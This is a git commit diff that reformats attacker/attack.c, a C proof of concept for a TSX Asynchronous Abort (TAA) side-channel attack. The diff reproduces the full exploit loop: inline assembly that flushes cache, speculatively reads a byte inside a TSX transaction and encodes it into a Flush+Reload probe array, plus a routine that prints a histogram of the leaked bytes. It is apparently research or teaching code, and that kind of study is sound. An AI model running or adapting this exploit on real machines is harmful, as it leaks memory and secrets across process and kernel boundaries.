62f4167fbad49b4554bece2e2007785c4a00d4ef
Ameer Hamza <amhamza.pk@gmail.com>
2021-08-22 02:14:31 +0500

    formatting changes

--- attacker/attack.c
+++ attacker/attack.c
@@ -38,49 +38,49 @@ int main(int argc, char *argv[])
 
   int line = 33;
   if (argc > 1) {
-	  line =  atoi(argv[1]);
+      line =  atoi(argv[1]);
   }
 
   /* Initialize mapping */
   memset(mapping, 0, 4096);
 
   while (true) {
-	  if (!print_once) {
-		  print_once = 1;
-		  printf("TAA Attack in Progress...\n");
-	  }
-	    __asm__ __volatile__ (
-			"movq %3, %%rdi;"				// Move mapping (leak source) to "rdi"
-			"clflush (%%rdi);"				// Flush Mapping array
-			"movq %4, %%rsi;"				// Move mem (Timings / Flush+Reload Channel) to "rsi"
-			"xbegin 2f;"					// Start TSX Transaction
-			"movq (%%rdi), %%rax;"			// Leak a single byte from mapping (leak source) and speculatively load in rax register
-			"shl $12, %%rax;"				// Multiply leak source with 4096 256x4096, i.e. 4096 entries apart each byte
-			"andq $0xff000, %%rax;"			// We are only interested in 256 bytes uppper than 4096
-			"movq (%%rax, %%rsi), %%rax;"	// Use the leak byte as a index to load into Timing (F+R) Channel. Its footprint will be left on cache
-			"xend;"							// End TSX Transaction
-			"movq %1, %%rcx;"
-			"incq %%rcx;"
-			"movq %%rcx, %1;"
-			"movq $0, %0;"
-			"jmp 3f;"
-			"2:"
-			"movq %2, %%rdx;"
-			"incq %%rdx;"
-			"movq %%rdx, %2;"
-			"movq $1, %0;"
-			"3:;"
-			: "=g"(abort_flag), "=g"(aborted), "=g"(not_aborted) : "r" (mapping), "r" (mem), "r"(aborted), "r"(not_aborted) : "rcx", "rdx"
-	    );
+      if (!print_once) {
+          print_once = 1;
+          printf("TAA Attack in Progress...\n");
+      }
+        __asm__ __volatile__ (
+            "movq %3, %%rdi;"				// Move mapping (leak source) to "rdi"
+            "clflush (%%rdi);"				// Flush Mapping array
+            "movq %4, %%rsi;"				// Move mem (Timings / Flush+Reload Channel) to "rsi"
+            "xbegin 2f;"					// Start TSX Transaction
+            "movq (%%rdi), %%rax;"			// Leak a single byte from mapping (leak source) and speculatively load in rax register
+            "shl $12, %%rax;"				// Multiply leak source with 4096 256x4096, i.e. 4096 entries apart each byte
+            "andq $0xff000, %%rax;"			// We are only interested in 256 bytes uppper than 4096
+            "movq (%%rax, %%rsi), %%rax;"	// Use the leak byte as a index to load into Timing (F+R) Channel. Its footprint will be left on cache
+            "xend;"							// End TSX Transaction
+            "movq %1, %%rcx;"
+            "incq %%rcx;"
+            "movq %%rcx, %1;"
+            "movq $0, %0;"
+            "jmp 3f;"
+            "2:"
+            "movq %2, %%rdx;"
+            "incq %%rdx;"
+            "movq %%rdx, %2;"
+            "movq $1, %0;"
+            "3:;"
+            : "=g"(abort_flag), "=g"(aborted), "=g"(not_aborted) : "r" (mapping), "r" (mem), "r"(aborted), "r"(not_aborted) : "rcx", "rdx"
+        );
 
-	    if (abort_flag) {
-	    	abrt_cnter++;
-	    }
+        if (abort_flag) {
+            abrt_cnter++;
+        }
 
-	     if (temp++ > 50000) {
-	    	 temp = 0;
-	 	    abrt_cnter = 0;
-		 }
+         if (temp++ > 50000) {
+             temp = 0;
+             abrt_cnter = 0;
+         }
     /* Recover through probe mem array */
     recover();
   }
@@ -106,33 +106,33 @@ void recover(void) {
 
     if (update == true /*|| (++not_update > 1000000)*/)
     {
-    	not_update = 0;
+        not_update = 0;
         printf("\x1b[2J");
 
         int max = 1;
 
         if (timeout++ > 200)
         {
-        	timeout = 0;
+            timeout = 0;
 
-			for (int i = FROM; i <= TO; i++) {
-			  if (hist[i] > max) {
-				max = hist[i];
-			  }
-			}
+            for (int i = FROM; i <= TO; i++) {
+              if (hist[i] > max) {
+                max = hist[i];
+              }
+            }
 
-			for (int i = FROM; i <= TO; i++) {
-				printf("%c: (%4u) ", i, (unsigned int)hist[i]);
-				for (int j = 0; j < hist[i] * 60 / max; j++) {
-				  printf("#");
-				}
-				printf("\n");
-			}
-			printf("Aborted_Count: %lld\n", aborted);
-			printf("Not_Aborted_Count: %lld\n", not_aborted);
-			printf("Percentage Abort => %f\n", (float) (aborted * 100) / not_aborted);
+            for (int i = FROM; i <= TO; i++) {
+                printf("%c: (%4u) ", i, (unsigned int)hist[i]);
+                for (int j = 0; j < hist[i] * 60 / max; j++) {
+                  printf("#");
+                }
+                printf("\n");
+            }
+            printf("Aborted_Count: %lld\n", aborted);
+            printf("Not_Aborted_Count: %lld\n", not_aborted);
+            printf("Percentage Abort => %f\n", (float) (aborted * 100) / not_aborted);
 
-			fflush(stdout);
+            fflush(stdout);
         }
     }
 }
